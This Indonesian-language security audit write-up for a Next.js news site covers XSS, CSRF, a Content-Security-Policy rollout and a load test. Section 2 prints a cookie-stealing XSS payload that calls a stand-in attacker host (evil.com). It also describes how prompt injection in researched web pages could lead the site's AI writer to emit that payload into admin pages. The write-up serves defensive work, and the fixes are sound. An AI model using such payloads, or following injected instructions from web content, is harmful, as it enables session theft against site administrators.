# Catatan Belajar Keamanan — LinkProMedia (11 Agustus 2026)

Dokumen ini merangkum sesi audit keamanan project LinkProMedia: apa yang dicek, apa yang ditemukan, konsep di baliknya, dan perbaikan yang sudah diterapkan. Ditulis sebagai bahan belajar, bukan cuma catatan teknis — tiap temuan disertai penjelasan *kenapa* itu masalah.

## Ringkasan cepat

| Area | Status | Aksi |
|---|---|---|
| Auth & session | Aman | - |
| API & input validation | **1 temuan (Medium) — sudah diperbaiki** | XSS via `dangerouslySetInnerHTML` |
| Secrets & env management | Aman | - |
| Dependency & supply chain | Aman (3 `npm audit` high, non-urgent) | Ditunda sampai upgrade Next.js 16 |
| CSRF | Aman (dilindungi `SameSite=Lax`) | - |
| Security headers | **1 gap (Medium) — sudah diperbaiki** | CSP ditambahkan |
| File upload storage | Aman | - |
| Webhook/cron endpoint | Aman | - |

---

## 1. Konsep dasar: Cross-Site Scripting (XSS)

XSS terjadi ketika data yang seharusnya ditampilkan sebagai teks biasa malah **dieksekusi sebagai kode JavaScript** di browser korban. Browser tidak otomatis tahu mana "teks" dan mana "instruksi" — developer yang harus menegaskan batas itu.

Tiga jenis utama:
- **Reflected** — payload ada di URL/request, dipantulkan balik ke halaman (butuh korban klik link jahat).
- **Stored** — payload disimpan di database, dieksekusi tiap kali halaman itu dibuka orang lain. Lebih berbahaya karena tidak perlu korban klik apa pun.
- **DOM-based** — JavaScript client sendiri menyuntikkan data ke DOM secara tidak aman tanpa lewat server.

### Kenapa React "aman", tapi ada pintu belakangnya

React secara default **auto-escape** — `<div>{userInput}</div>` otomatis mengubah `<script>` jadi teks tampilan, bukan kode yang dijalankan.

Pengecualiannya: `dangerouslySetInnerHTML`. Properti ini secara eksplisit mematikan proteksi itu — begitu dipakai, React percaya string itu HTML mentah dan merender apa adanya. Tanggung jawab menyaring HTML pindah ke tangan developer.

## 2. Temuan: XSS via `dangerouslySetInnerHTML` (Medium — sudah diperbaiki)

**Lokasi (sebelum fix):**
- `src/app/admin/(dashboard)/artikel/tulis-ai/TulisAiClient.tsx:228`
- `src/components/admin/AiChatPanel.tsx:666`

**Rantai masalah:**
```
dangerouslySetInnerHTML={{ __html: draf.content }}
                                  ↑
                    draf.content = hasil JSON dari AI (Groq/Cerebras/Gemini)
                                  ↑
                    disusun AI berdasarkan hasil riset web (Tavily search / RSS)
                                  ↑
                    teks dari website MANAPUN di internet — tidak dikontrol project ini
```

Prompt AI hanya *meminta* model menulis tag `<p>`/`<h2>` saja — itu instruksi, bukan aturan yang dipaksakan kode. Kalau ada website yang isinya disusun untuk menjebak AI (*prompt injection*) agar ikut menuliskan `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` di outputnya, string itu lolos sampai ke `dangerouslySetInnerHTML` — dan browser **admin yang sedang login** akan menjalankannya. Berisiko mencuri sesi admin.

**Fix yang diterapkan:** membungkus kedua render dengan `sanitizeHtml()` (`src/lib/sanitize.ts`) — fungsi allowlist yang sudah dipakai konsisten di halaman artikel publik, membuang tag/atribut berbahaya (`<script>`, `onerror=`, `javascript:`, dll) dan hanya meloloskan tag/atribut dari daftar putih.

```tsx
dangerouslySetInnerHTML={{ __html: sanitizeHtml(draf.content) }}
```

> **Catatan lanjutan:** `sanitizeHtml()` berbasis regex, bukan parser DOM asli seperti `DOMPurify`. Regex-based sanitizer secara umum lebih rawan di-*bypass* oleh HTML yang aneh/bertingkat. Ini pola lama yang sudah dipakai konsisten di seluruh codebase (di luar cakupan perbaikan sesi ini) — kalau mau upgrade suatu saat, `isomorphic-dompurify` adalah pilihan standar industri.

## 3. Audit area lain

### CSRF — Aman
NextAuth v5 (default library, tidak di-override) memakai cookie sesi `SameSite=Lax`. Browser modern (Chrome/Firefox/Safari/Edge) tidak mengirim cookie ini pada request lintas-situs (POST/PATCH/DELETE dari domain lain) — jadi request admin yang dipalsukan dari website luar otomatis dianggap "tidak login" di server, tanpa perlu token CSRF tambahan.

⚠️ Jangan ubah `sameSite` di `src/lib/auth.ts` jadi `"none"` — itu akan membuka celah ini.

### Security headers — 1 gap ditemukan, sudah diperbaiki (lihat §4)
Header lain (`X-Content-Type-Options`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`, `Permissions-Policy`) sudah terpasang di `next.config.ts`. `Strict-Transport-Security` sudah otomatis ditambahkan Vercel di level edge, jadi header versi app-nya redundan tapi tidak berbahaya.

Yang tadinya belum ada: **Content-Security-Policy (CSP)** — lihat §4.

### File upload — Aman, contoh praktik yang baik
`src/app/api/admin/upload/route.ts`:
- Tipe file di-allowlist (`jpeg/png/webp` saja — **SVG ditolak**, menutup celah upload-XSS-via-SVG yang sering terlewat karena SVG bisa berisi `<script>`).
- Nama file **tidak pernah dari input user** — di-generate server (`crypto.randomUUID()`), sehingga path traversal mustahil.
- Content-Type divalidasi dari **magic bytes** file asli, bukan cuma percaya header `Content-Type` yang dikirim client.
- Disimpan di Supabase Storage, disajikan kembali dengan Content-Type yang sudah divalidasi (tidak bisa balik jadi `text/html`).

### Webhook/Cron — Aman
Cuma satu endpoint jenis ini: `src/app/api/cron/promote-scheduled/route.ts`, dilindungi `CRON_SECRET` via bearer token, dan aksinya idempoten (tidak berbahaya meski ada yang mencoba akses tanpa izin).

### Secrets & dependency — Aman
Semua API key (Groq/Cerebras/Gemini/Tavily) dibaca lewat `process.env` di server-side saja, tidak pernah masuk ke bundle client. `npm audit` menyisakan 3 finding high, tapi asalnya dari dalam `node_modules/next` sendiri (postcss/sharp untuk build/image-processing), tidak tercapai lewat API yang live — ditunda sampai upgrade ke Next.js 16.

## 4. Implementasi CSP (Content-Security-Policy)

### Konsepnya
CSP adalah header HTTP berisi "daftar sumber yang boleh dimuat/dijalankan browser" untuk halaman itu. Contoh: `script-src 'self'` artinya browser cuma boleh menjalankan JavaScript dari domain sendiri.

Ini penting sebagai **lapisan pertahanan kedua**: kalau suatu saat ada XSS lain yang lolos dari sanitasi (§2 adalah contohnya), CSP bisa mencegah script yang disuntikkan itu benar-benar berjalan — bahkan setelah berhasil masuk ke DOM.

### Percobaan pertama: nonce — DIBATALKAN karena merusak caching

Pendekatan "paling aman" secara teori adalah **nonce**: middleware membuat angka acak sekali pakai per-request, `<script>` yang sah ditandai nonce itu, dan CSP hanya mengizinkan script yang membawa nonce cocok. Script yang diselundupkan lewat XSS tidak tahu nonce-nya, jadi diblokir browser.

Pendekatan ini sempat diimplementasikan, lalu **dibatalkan** setelah load test membuktikan efek sampingnya fatal:

Supaya nonce sampai ke HTML, root layout harus memanggil `headers()`. Di App Router, `headers()` adalah *Dynamic API* — memanggilnya di **root layout** membuat **seluruh halaman** ikut jadi dynamic. Akibatnya:

| | Sebelum (nonce) | Sesudah (dibatalkan) |
|---|---|---|
| `Cache-Control` halaman artikel | `no-store, must-revalidate` | `s-maxage=60, stale-while-revalidate` |
| `x-nextjs-cache` | (tidak ada) | `HIT` |
| Waktu respons | ~0,88 dtk | ~0,009 dtk |
| Status di build | `ƒ` dynamic (banyak halaman) | `●`/`○` static/SSG |

Artinya: dengan nonce, tiap pembaca memicu render penuh + kueri database sendiri — persis kondisi yang bikin sistem rentan saat traffic melonjak. Untuk situs berita, **ketahanan saat lonjakan pembaca lebih berharga** daripada memblokir eksekusi script inline.

### Implementasi final: CSP tanpa nonce, di `next.config.ts`

Karena tanpa nonce nilainya jadi string tetap, CSP dipasang sebagai header statis di `next.config.ts` bersama header keamanan lain — dan `src/middleware.ts` dikembalikan persis seperti semula (cakupan `/admin/*` saja, tidak menyentuh halaman publik):

```
default-src 'self';
script-src 'self' 'unsafe-inline' [+ 'unsafe-eval' khusus dev];
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https://res.cloudinary.com https://*.public.blob.vercel-storage.com https://*.supabase.co;
media-src 'self' blob:;
font-src 'self' data:;
connect-src 'self';
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'self';
```

**Apa yang hilang & apa yang tetap terlindungi** (penting untuk dipahami):
- *Hilang*: `'unsafe-inline'` berarti CSP **tidak** memblokir eksekusi script yang berhasil disuntikkan. Proteksi utama terhadap XSS jadi bertumpu pada `sanitizeHtml()` (§2).
- *Tetap ada*: jalur **pencurian data** ditutup. `connect-src 'self'` memblokir `fetch()`/XHR ke server penyerang, dan `img-src` allowlist memblokir trik `<img src="https://evil.com/?c="+cookie>`. Padahal justru itu langkah terakhir serangan di §2 — script boleh jalan, tapi tidak punya kanal untuk mengirim cookie keluar. `object-src 'none'`, `base-uri`, `form-action`, `frame-ancestors` juga tetap aktif.
- `'unsafe-eval'` **hanya** muncul saat `NODE_ENV !== "production"` (dev server Next.js butuh `eval()` untuk fast refresh) — tidak pernah ikut ter-deploy.

### Verifikasi
- Diuji di browser (dev): homepage, halaman login admin, halaman artikel — tanpa pelanggaran CSP, tema & fetch API tetap berfungsi.
- Diuji di build produksi lokal: header CSP muncul, `x-nextjs-cache: HIT`, dan status statis/SSG kembali seperti semula (lihat §7).

## 5. File yang diubah sesi ini

- `src/app/admin/(dashboard)/artikel/tulis-ai/TulisAiClient.tsx` — sanitasi output AI
- `src/components/admin/AiChatPanel.tsx` — sanitasi output AI (fitur terjemahan)
- `next.config.ts` — tambah header `Content-Security-Policy`

`src/middleware.ts`, `src/app/layout.tsx`, dan `src/components/layout/ThemeScript.tsx` sempat diubah untuk pendekatan nonce, lalu **dikembalikan ke kondisi semula** setelah pendekatan itu dibatalkan.

## 6. Ide lanjutan (belum dikerjakan, tidak mendesak)

- Upgrade ke Next.js 16 untuk membereskan 3 sisa `npm audit` high (postcss/sharp bawaan `next`).
- Pertimbangkan `isomorphic-dompurify` sebagai pengganti `sanitizeHtml()` regex-based, kalau butuh jaminan lebih kuat terhadap HTML yang aneh/bertingkat. Ini jadi lebih bernilai sekarang, karena CSP tidak lagi memblokir eksekusi script inline (§4) — sanitasi jadi lapisan pertahanan utama.
- Kalau suatu saat mau CSP ketat (nonce) **tanpa** mengorbankan caching: terapkan nonce hanya di area admin (yang memang selalu dynamic karena di balik login), bukan di root layout. Lebih rumit, tapi memungkinkan dapat keduanya.
- Tambahkan komentar di `src/lib/auth.ts` yang menegaskan "jangan ubah `sameSite`" supaya proteksi CSRF implisit ini tidak ter-regresi tanpa sadar di masa depan.

## 7. Load test — ketahanan saat traffic tinggi (11 Agustus 2026)

Diuji pada **build produksi yang dijalankan lokal** (`next build && next start`), bukan ke situs live, agar tidak mengganggu pengunjung asli. Target: halaman artikel.

| Skenario | Hasil |
|---|---|
| 200 koneksi bersamaan, 20 dtk | 4.779 request, **100% status 200, 0 error**, ~239 req/dtk |
| 1000 koneksi bersamaan, 30 dtk | ~4.700 request sukses (200), ~169 req/dtk, sisanya gagal di level koneksi |
| Kesehatan server setelah tes | Normal (respons 23 ms), **0 error di log server** |

Catatan penting untuk membaca hasil ini:
- Error di skenario 1000 koneksi adalah **kejenuhan soket lokal** (satu proses Node di laptop + autocannon berebut CPU di mesin yang sama), **bukan** kegagalan aplikasi — terbukti dari 200 koneksi yang mulus tanpa error sama sekali, log server bersih, dan server tetap sehat sesudahnya.
- Ini **lebih berat** daripada kondisi produksi sebenarnya: di Vercel, halaman statis/ISR dilayani CDN edge dan seringkali tidak menyentuh server sama sekali, serta berjalan di banyak instance — bukan satu proses Node tunggal seperti di tes ini.
- **Temuan utama**: halaman artikel dilayani dari cache (`x-nextjs-cache: HIT`) sehingga **tidak ada kueri database sama sekali** selama belasan ribu request. Inilah yang membuat lonjakan pembaca aman — berbeda dari kasus LP-ISS (lihat `studi-kasus-lp-iss-downtime.md`) di mana submit formulir adalah operasi **tulis** yang secara sifatnya tidak bisa di-cache.

### Yang belum teruji
- Limit paket Vercel Hobby (concurrency/eksekusi function) — tidak bisa direplikasi secara lokal.
- Endpoint `POST /api/analytics` yang terpanggil tiap kunjungan dan **tidak** ikut ter-cache (karena operasi tulis). Untuk lonjakan wajar ini aman, tapi ini titik yang paling layak diawasi kalau suatu saat ada artikel yang benar-benar viral.